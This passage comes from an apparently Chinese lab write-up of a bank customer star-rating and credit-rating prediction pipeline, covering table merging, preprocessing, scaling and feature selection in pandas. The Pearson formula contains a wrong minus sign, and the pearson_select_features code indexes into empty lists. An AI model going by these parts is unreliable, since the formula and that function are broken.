<td><strong>个人网银交易</strong></td>
<td><strong>dm_v_tr_grwy_mx</strong></td>
<td>反映客户星级</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>金额越高星级越高</td>
</tr>
<tr>
<td><strong>工资代发明细</strong></td>
<td><strong>dm_v_tr_gzdf_m</strong></td>
<td>反映客户星级</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>金额越高星级越高</td>
</tr>
<tr>
<td><strong>贷款还本明细</strong></td>
<td><strong>dm_v_tr_huanb_mx</strong></td>
<td>反应客户信用</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>贷款金额越低一般信用越高</td>
</tr>
<tr>
<td>bal</td>
<td>余额</td>
<td>贷款余额额越低一般信用越低</td>
</tr>
<tr>
<td>pay_term</td>
<td>还款期数</td>
<td>期数越高一般信用越高</td>
</tr>
<tr>
<td>pprd_rfn_amt</td>
<td>每期还款金额</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>pprd_amotz_intr</td>
<td>每期摊还额计算利息</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td><strong>贷款还息明细</strong></td>
<td><strong>dm_v_tr_huanx_mx</strong></td>
<td>反应客户信用</td>
</tr>
<tr>
<td>tran_amt</td>
<td>利息</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>cac_intc_pr</td>
<td>计息本金</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>pay_term</td>
<td>还款期数</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>intr</td>
<td>利率</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td><strong>活期交易</strong></td>
<td><strong>dm_v_tr_sa_mx</strong></td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td><strong>社保医保交易</strong></td>
<td><strong>dm_v_tr_sbyb_mx</strong></td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td>tran_amt_fen</td>
<td>交易金额</td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td><strong>水电燃气交易</strong></td>
<td><strong>dm_v_tr_sdrq_mx</strong></td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td>tran_amt_fen</td>
<td>交易金额</td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td><strong>商户交易明细</strong></td>
<td><strong>dm_v_tr_shop_mx</strong></td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td>score_num</td>
<td>优惠积分</td>
<td>积分越高，客户星级越高</td>
</tr>
<tr>
<td><strong>手机银行交易</strong></td>
<td><strong>dm_v_tr_sjyh_mx</strong></td>
<td>交易额越高，客户星级越高</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>交易额越高，客户星级越高</td>
</tr>
</tbody></table>
<h4 id="2-表内按uid合并"><a href="#2-表内按uid合并" class="headerlink" title="2. 表内按uid合并"></a>2. 表内按uid合并</h4><p>​	在每张表内，可能同一个uid会出现多次，需要进行合并，使得每张表内每个uid都是唯一的，具体处理策略为：</p>
<ul>
<li><p>对于数值型列，如果是可加的使用sum合并，如果是不能相加的（一些特殊的），使用mean合并；</p>
</li>
<li><p>对于非数值列，使用众数合并；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 表内按照uid合并</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inner_merge</span>(<span class="params">df, table_name</span>):</span><br><span class="line">    <span class="comment"># 将能转换成数字的都转换成数字，不能转化的保留</span></span><br><span class="line">    df = df.apply(pd.to_numeric, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="comment"># 按uid排序，方便合并</span></span><br><span class="line">    df = df.sort_values(<span class="string">&#x27;uid&#x27;</span>, ascending=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 先选择合适字段</span></span><br><span class="line">    df_selected = df[select_cols[table_name]]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于不良标记（is_bad)列，没有时应填充，以防被后面过滤</span></span><br><span class="line">    df_selected = df_selected.copy()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_bad&#x27;</span> <span class="keyword">in</span> df_selected.columns:</span><br><span class="line">        df_selected.fillna(<span class="string">&#x27;N&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找出数值列与非数值列</span></span><br><span class="line">    numeric_cols = df_selected.select_dtypes(include=<span class="string">&#x27;number&#x27;</span>).columns</span><br><span class="line">    non_numeric_cols = df_selected.select_dtypes(exclude=<span class="string">&#x27;number&#x27;</span>).columns</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 特殊处理: 当’five_class‘为非数值型时，转化为数值型</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;five_class&#x27;</span> <span class="keyword">in</span> non_numeric_cols:</span><br><span class="line">        df[<span class="string">&#x27;five_class&#x27;</span>] = df[<span class="string">&#x27;five_class&#x27;</span>].<span class="built_in">str</span>.extract(<span class="string">r&#x27;(\d+)&#x27;</span>)</span><br><span class="line">        df[<span class="string">&#x27;five_class&#x27;</span>] = pd.to_numeric(df[<span class="string">&#x27;five_class&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义列的合并方式，对可取和的数值型的列，使用sum合并，不能取和的使用mean合并;对于枚举型字符串的列，使用众数合并</span></span><br><span class="line">    agg_function = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> numeric_cols:</span><br><span class="line">        <span class="keyword">if</span> col <span class="keyword">in</span> [<span class="string">&#x27;five_class&#x27;</span>]:</span><br><span class="line">            agg_function[col] = <span class="string">&#x27;mean&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            agg_function[col] = <span class="string">&#x27;sum&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> non_numeric_cols:</span><br><span class="line">        <span class="keyword">if</span> col == <span class="string">&#x27;uid&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        agg_function[col] = util.util.compute_mode</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按uid合并</span></span><br><span class="line">    df_merged = df_selected.groupby(<span class="string">&#x27;uid&#x27;</span>).agg(agg_function).reset_index()</span><br><span class="line">    df_merged = df_merged.sort_values(<span class="string">&#x27;uid&#x27;</span>, ascending=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> df_merged</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-多表按uid连接"><a href="#3-多表按uid连接" class="headerlink" title="3. 多表按uid连接"></a>3. 多表按uid连接</h4><p>​	将所有表按照uid进行连接，合并成一个很多列的大表，为了区分不同表之间可能重复的列名，将除了uid、star_level、credit_level以外的列名改为’表名:列名‘。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 多表按uid合并为一个大表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_aggregate</span>(<span class="params">tables</span>):</span><br><span class="line">    df_merged = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> table_name, table_data <span class="keyword">in</span> tables.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now aggregate table &quot;</span> + table_name)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将除了uid、star_level、credit_level以外的列名改为 表名+列名</span></span><br><span class="line">        prefix = <span class="string">f&#x27;<span class="subst">&#123;table_name&#125;</span>:&#x27;</span></span><br><span class="line">        table_data.columns = [prefix + col <span class="keyword">if</span> col <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;credit_level&#x27;</span>, <span class="string">&#x27;star_level&#x27;</span>] <span class="keyword">else</span> col <span class="keyword">for</span> col <span class="keyword">in</span> table_data.columns]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> df_merged <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            df_merged = table_data.copy()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            df_merged = pd.merge(df_merged, table_data, on=<span class="string">&#x27;uid&#x27;</span>, how=<span class="string">&#x27;outer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> df_merged</span><br></pre></td></tr></table></figure>

<h4 id="4-区分训练集与测试集"><a href="#4-区分训练集与测试集" class="headerlink" title="4. 区分训练集与测试集"></a>4. 区分训练集与测试集</h4><p>​	根据’star_level‘列和’credit_level‘列是否为-1来区分测试集和训练集，并且将这两列的值为空的行排除。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 区分用户星级的训练集与测试集，并过滤掉用户星级为空的行</span></span><br><span class="line">df_star_train = df_merged.loc[df_merged[<span class="string">&#x27;star_level&#x27;</span>] != -<span class="number">1</span>]</span><br><span class="line">df_star_train = df_star_train.dropna(subset=[<span class="string">&#x27;star_level&#x27;</span>]).drop(<span class="string">&#x27;credit_level&#x27;</span>, axis=<span class="number">1</span>)</span><br><span class="line">df_star_test = df_merged.loc[df_merged[<span class="string">&#x27;star_level&#x27;</span>] == -<span class="number">1</span>].drop(<span class="string">&#x27;credit_level&#x27;</span>, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 区分客户信用的训练集与测试集，并过滤掉客户信用为空的行</span></span><br><span class="line">df_credit_train = df_merged.loc[df_merged[<span class="string">&#x27;credit_level&#x27;</span>] != -<span class="number">1</span>]</span><br><span class="line">df_credit_train = df_credit_train.dropna(subset=[<span class="string">&#x27;credit_level&#x27;</span>]).drop(<span class="string">&#x27;star_level&#x27;</span>, axis=<span class="number">1</span>)</span><br><span class="line">df_credit_test = df_merged.loc[df_merged[<span class="string">&#x27;credit_level&#x27;</span>] == -<span class="number">1</span>].drop(<span class="string">&#x27;star_level&#x27;</span>, axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="5-数据盘点"><a href="#5-数据盘点" class="headerlink" title="5. 数据盘点"></a>5. 数据盘点</h4><p>​	使用pandas的describe函数进行数据盘点，统计数据集各字段的平均数、最小值、最大值、四位位数和标准差，结果保存在resources&#x2F;inventory&#x2F;中，示例如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/inventory.png" alt="inventory"></p>
<p>​	数据盘点的可视化使用matplot绘制数据集的柱状图和箱线图，结果保存在resources&#x2F;inventory&#x2F;中，示例如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/inventory_bar.png" alt="inventory_bar" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/inventory_box.png" alt="inventory_box" style="zoom:50%;" />

<p>​	在数据盘点时，由于是否处理异常值会影响盘点结果，在处理异常值前和后都进行了一次数据盘点，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># star</span></span><br><span class="line">df = pd.read_csv(<span class="string">&quot;resources/star/star_train.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据盘点，此时数据还没有经过异常值处理</span></span><br><span class="line">description = df.describe()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存数据盘点结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Description(before handling missing values):\n&quot;</span>, description)</span><br><span class="line">description.to_csv(<span class="string">&#x27;resources/inventory/star_train_description_before_handling_missing.csv&#x27;</span>, index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制柱状图</span></span><br><span class="line">description.plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">20</span>, <span class="number">16</span>))</span><br><span class="line">plt.title(<span class="string">&#x27;Descriptive Statistics&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Statistics&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制箱线图</span></span><br><span class="line">description.plot(kind=<span class="string">&#x27;box&#x27;</span>, figsize=(<span class="number">20</span>, <span class="number">16</span>))</span><br><span class="line">plt.title(<span class="string">&#x27;Descriptive Statistics&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Statistics&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行异常值处理后，再盘点一次</span></span><br><span class="line">df_handled = preprocess.handle_missing_values(df, is_test=<span class="literal">False</span>)</span><br><span class="line">description_handled = df_handled.describe()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存数据盘点结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Description(after handling missing values):\n&quot;</span>, description_handled)</span><br><span class="line">description_handled.to_csv(<span class="string">&#x27;resources/inventory/star_train_description_after_handling_missing.csv&#x27;</span>, index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制柱状图</span></span><br><span class="line">description_handled.plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">20</span>, <span class="number">16</span>))</span><br><span class="line">plt.title(<span class="string">&#x27;Descriptive Statistics&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Statistics&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制箱线图</span></span><br><span class="line">description_handled.plot(kind=<span class="string">&#x27;box&#x27;</span>, figsize=(<span class="number">20</span>, <span class="number">16</span>))</span><br><span class="line">plt.title(<span class="string">&#x27;Descriptive Statistics&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Statistics&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h3 id="二-数据预处理"><a href="#二-数据预处理" class="headerlink" title="二 数据预处理"></a>二 数据预处理</h3><h4 id="1-缺失值处理"><a href="#1-缺失值处理" class="headerlink" title="1. 缺失值处理"></a>1. 缺失值处理</h4><p>​	首先剔除缺失率大于0.7的列，然后对于剩下的缺失值进行填充，具体的，对于数值型变量，用中位数填充缺失值；对于类别型变量，用众数填充缺失值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">handle_missing_values</span>(<span class="params">df, is_test</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于训练集，需要剔除缺失率大的列，而测试集的列应与训练集保持一致</span></span><br><span class="line">    <span class="keyword">if</span> is_test <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="comment"># 计算每列的缺失率</span></span><br><span class="line">        missing_rate = df.isna().mean()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据缺失率剔除缺失率大的列</span></span><br><span class="line">        min_missing_rate = <span class="number">0.7</span></span><br><span class="line">        df = df.loc[:, (missing_rate &lt; min_missing_rate) | (df.columns.isin(columns_to_keep))]</span><br><span class="line"></span><br><span class="line">    df = df.copy()</span><br><span class="line">    <span class="comment"># 对于数值型变量，用中位数填充缺失值</span></span><br><span class="line">    numeric_cols = df.select_dtypes(include=<span class="string">&#x27;number&#x27;</span>).columns</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> numeric_cols:</span><br><span class="line">        <span class="keyword">if</span> col <span class="keyword">in</span> columns_to_keep:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        median = df[col].median()</span><br><span class="line">        df[col].fillna(median, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于类别型变量，用众数填充缺失值</span></span><br><span class="line">    non_numeric_cols = df.select_dtypes(include=<span class="string">&#x27;object&#x27;</span>).columns</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> non_numeric_cols:</span><br><span class="line">        <span class="keyword">if</span> col <span class="keyword">in</span> columns_to_keep:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        mode = df[col].mode()[<span class="number">0</span>]</span><br><span class="line">        df[col].fillna(mode, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    df_handled = df</span><br><span class="line">    <span class="keyword">return</span> df_handled</span><br></pre></td></tr></table></figure>

<h4 id="2-异常值处理"><a href="#2-异常值处理" class="headerlink" title="2. 异常值处理"></a>2. 异常值处理</h4><p>​	对于数值型列，将小于5%和大于95%的使用5%和95%的数据替换。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">handle_outliers</span>(<span class="params">df</span>):</span><br><span class="line"></span><br><span class="line">    numeric_cols = df.select_dtypes(include=<span class="string">&#x27;number&#x27;</span>).columns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> numeric_cols:</span><br><span class="line">        <span class="keyword">if</span> col <span class="keyword">in</span> columns_to_keep:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        lower_threshold = df[col].quantile(<span class="number">0.05</span>)</span><br><span class="line">        upper_threshold = df[col].quantile(<span class="number">0.95</span>)</span><br><span class="line"></span><br><span class="line">        df.loc[df[col] &lt; lower_threshold, col] = lower_threshold</span><br><span class="line">        df.loc[df[col] &gt; upper_threshold, col] = upper_threshold</span><br><span class="line"></span><br><span class="line">    df_handled = df</span><br><span class="line">    <span class="keyword">return</span> df_handled</span><br></pre></td></tr></table></figure>

<h4 id="3-数据转换"><a href="#3-数据转换" class="headerlink" title="3. 数据转换"></a>3. 数据转换</h4><p>​	使用标签编码（Label Encoding），将非数值特征转换为数值特征。在数据转换时，排除uid、credit_level 、star_level三个列。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">transfer_nonnumerical</span>(<span class="params">df</span>):</span><br><span class="line"></span><br><span class="line">    label_encoder = LabelEncoder()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择非数值型列</span></span><br><span class="line">    non_numeric_cols = df.select_dtypes(exclude=<span class="string">&#x27;number&#x27;</span>).columns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> non_numeric_cols:</span><br><span class="line">        <span class="keyword">if</span> col <span class="keyword">in</span> columns_to_keep:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        df[col] = label_encoder.fit_transform(df[col])</span><br><span class="line"></span><br><span class="line">    df_transferred = df</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> df_transferred</span><br></pre></td></tr></table></figure>

<h4 id="4-数据标准化"><a href="#4-数据标准化" class="headerlink" title="4. 数据标准化"></a>4. 数据标准化</h4><p>​	使用Min-Max标准化（Normalization），通过线性变换将数据缩放到指定的范围，通常是0到1之间，转换公式：<br>$$<br>x* &#x3D; ( x − min ) &#x2F; ( max − min )<br>$$<br>​	 为了在之后预测时复用同一个标准化工具对象，使得标准化过程一致，需要使用pickle保存标准化对象（scaler）；在标准化时，排除uid、credit_level 、star_level三个列。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standardize</span>(<span class="params">df, is_test</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 为了在之后预测时复用同一个标准化工具对象，需要保存标准化对象（scaler）</span></span><br><span class="line">    save_scaler_pickle_path = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择不想被标准化的列</span></span><br><span class="line">    y_columns = [<span class="string">&#x27;uid&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;credit_level&#x27;</span> <span class="keyword">in</span> df.columns:</span><br><span class="line">        y_columns.append(<span class="string">&#x27;credit_level&#x27;</span>)</span><br><span class="line">        save_scaler_pickle_path = <span class="string">&#x27;resources/pickle/credit_scaler_pickle.pk1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        y_columns.append(<span class="string">&#x27;star_level&#x27;</span>)</span><br><span class="line">        save_scaler_pickle_path = <span class="string">&#x27;resources/pickle/star_scaler_pickle.pk1&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果是训练集，需要新建一个标准化对象并拟合；如果是测试集，则复用之前的</span></span><br><span class="line">    <span class="keyword">if</span> is_test <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        scaler = MinMaxScaler()</span><br><span class="line">        scaler.fit(df.drop(y_columns, axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将拟合后的标准化对象保存</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(save_scaler_pickle_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            pickle.dump(scaler, file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(save_scaler_pickle_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            scaler = pickle.load(file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对数据进行标准化</span></span><br><span class="line">    df_standardized = scaler.transform(df.drop(y_columns, axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将未被标准化的列添加回来</span></span><br><span class="line">    df_standardized = pd.DataFrame(df_standardized, columns=df.drop(y_columns, axis=<span class="number">1</span>).columns)</span><br><span class="line">    df_standardized = pd.concat([df[y_columns], df_standardized], axis=<span class="number">1</span>)  <span class="comment"># 合并 DataFrame</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> df_standardized</span><br></pre></td></tr></table></figure>

<p>​	经过标准化后的数据示例如下：<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/credit_std.png" alt="credit_std"></p>
<h3 id="三-特征工程与特征选择"><a href="#三-特征工程与特征选择" class="headerlink" title="三 特征工程与特征选择"></a>三 特征工程与特征选择</h3><h4 id="1-特征工程"><a href="#1-特征工程" class="headerlink" title="1. 特征工程"></a>1. 特征工程</h4><p>​	特征工程（Feature Engineering）是数据预处理的一部分，涉及创建新的特征或转化现有特征以便更好地表示潜在问题，以提高机器学习模型的性能。它是通过使用领域知识来提取从原始数据中提取有用特征的过程。它有着如下作用：</p>
<ol>
<li>改善模型性能：通过创建与预测目标更密切相关的特征，可以提高模型的预测准确性。</li>
<li>降低计算成本：去除不相关或冗余的特征可以减少模型训练和预测所需的计算资源。</li>
<li>提高模型的可解释性：对于某些类型的模型，如决策树和线性模型，创建有意义的特征可以让模型的决策过程更容易理解。</li>
</ol>
<p>​	特征工程的常见方法包括缩放、离散化、交互、编码、缺失值处理等。这些方法的选择和实施通常需要依赖于实际问题的具体情况，如数据类型（例如，连续的、类别的、有序的等）、数据质量（例如，是否存在缺失值、异常值等）、预测目标、所使用的模型类型等。</p>
<p>​	本次实验中，我们选择如下的特征选择方式：</p>
<h5 id="1-1-皮尔逊相关系数"><a href="#1-1-皮尔逊相关系数" class="headerlink" title="1.1 皮尔逊相关系数"></a>1.1 皮尔逊相关系数</h5><p>$$<br>\rho_{x,y} &#x3D; \frac{cov(X,Y)}{\sigma_{x}\sigma_{y}} &#x3D; \frac{E((X - \mu_{X})(Y - \mu_{Y}))}{\sigma_{x}\sigma_{y}} &#x3D; \frac{E(XY) - E(X)E(Y)}{\sqrt{E(X^{2}) - E^{2}(X)} - \sqrt{E(Y^{2}) - E^{2}(Y)}}<br>$$</p>
<p>$$<br>\rho_{x,y} &#x3D; \frac{N\Sigma{XY} - \Sigma{X}\Sigma{Y}}{\sqrt{N\Sigma{X^{2}} - (\Sigma{X})^{2}}\sqrt{N\Sigma{Y^{2}} - (\Sigma{Y})^{2}}}<br>$$</p>
<p>​	皮尔逊相关系数（Pearson correlation coefficient）是一种衡量两个变量之间线性关系强度和方向的统计量。它的值范围在-1和1之间，其中：</p>
<p>​	1 表示完全正相关（一个变量增加，另一个变量也增加）。</p>
<p>​	-1 表示完全负相关（一个变量增加，另一个变量减少）。</p>
<p>​	0 表示两个变量之间没有线性关系。</p>
<p>皮尔逊相关系数的主要作用如下：</p>
<p>​	关系强度和方向：皮尔逊相关系数是最常用的方法之一，用于量化两个连续变量之间关系的强度和方向。但是，皮尔逊相关系数只衡量线性关系。如果两个变量之间的关系是非线性的，即使它们非常紧密，皮尔逊相关系数也可能接近于零。此外，皮尔逊相关系数对离群值非常敏感，这可能会对结果产生显著影响。因此，在进行相关性分析时，也需要考虑这些因素。</p>
<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">根据Pearson相关系数选择关联最大的k个特征</span></span><br><span class="line"><span class="string">输入为合并表后的路径，k为待选择的特征数量  </span></span><br><span class="line"><span class="string">返回值为一个二维列表，每一维长度均为k，分别代表对credit_level和star_level最相关的k个特征  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pearson_select_features</span>(<span class="params">file_path, k</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    y[0]代表credit_level</span></span><br><span class="line"><span class="string">    y[1]代表star_level</span></span><br><span class="line"><span class="string">    tbd，x[i]对应的就是第i个特征</span></span><br><span class="line"><span class="string">    scores[i][j]代表第j个特征对第i个标签的pearson相关系数，内容为(string:&lt;label_name&gt;, float:score)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    y = [[], []]</span><br><span class="line">    x = []</span><br><span class="line">    scores = [[], []]</span><br><span class="line">    <span class="comment"># 初始化 x,y</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        lst = line.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> lst:</span><br><span class="line">            key = item.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            value = item.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> key == <span class="string">&quot;credit_level&quot;</span> <span class="keyword">or</span> key == <span class="string">&quot;star_level&quot;</span>:</span><br><span class="line">                y[dict_tag[key]].append(value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x[dict_label[key]].append(value)</span><br><span class="line">    label_lst = <span class="built_in">list</span>(dict_label.keys())</span><br><span class="line">    <span class="keyword">for</span> j, feature <span class="keyword">in</span> <span class="built_in">enumerate</span>(x):</span><br><span class="line">        <span class="keyword">for</span> i, tag <span class="keyword">in</span> <span class="built_in">enumerate</span>(y):</span><br><span class="line">            scores[i][j] = (label_lst[j], np.corrcoef(feature, tag))</span><br><span class="line">    res = [[], []]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(scores)):</span><br><span class="line">        tag_scores = scores[i]</span><br><span class="line">        res[i] = select_k_features(tag_scores, k)</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h5 id="1-2-互信息"><a href="#1-2-互信息" class="headerlink" title="1.2 互信息"></a>1.2 互信息</h5><p>$$<br>I(X;Y) &#x3D; \int_{X} \int_{Y} P(X,Y)log\frac{P(X,Y)}{P(X)P(Y)}<br>$$</p>
<p>$$<br>&#x3D; \int_{X} \int_{Y}P(X,Y)log\frac{P(X,Y)}{P(X)} - \int_{X} \int_{Y}P(X,Y)logP(Y)<br>$$</p>
<p>$$<br>&#x3D; \int_{X} \int_{Y}P(X)\int_{Y}P(Y|X)log(Y|X) - \int_{Y}P(Y)logP(Y)<br>$$</p>
<p>$$<br>&#x3D; - \int_{X}P(X)H(Y|X&#x3D;x) + H(Y) &#x3D; H(Y) - H(Y|X)<br>$$</p>
<p>​	互信息，Mutual Information，缩写为MI，表示两个变量X与Y是否有关系，以及关系的强弱。互信息度量两个随机变量共享的信息——知道随机变量X,对随机变量Y的不确定性减少的程度（或者知道随机变量Y，对随机变量X的不确定性减少的程度。</p>
<p><strong>代码如下：</strong></p>
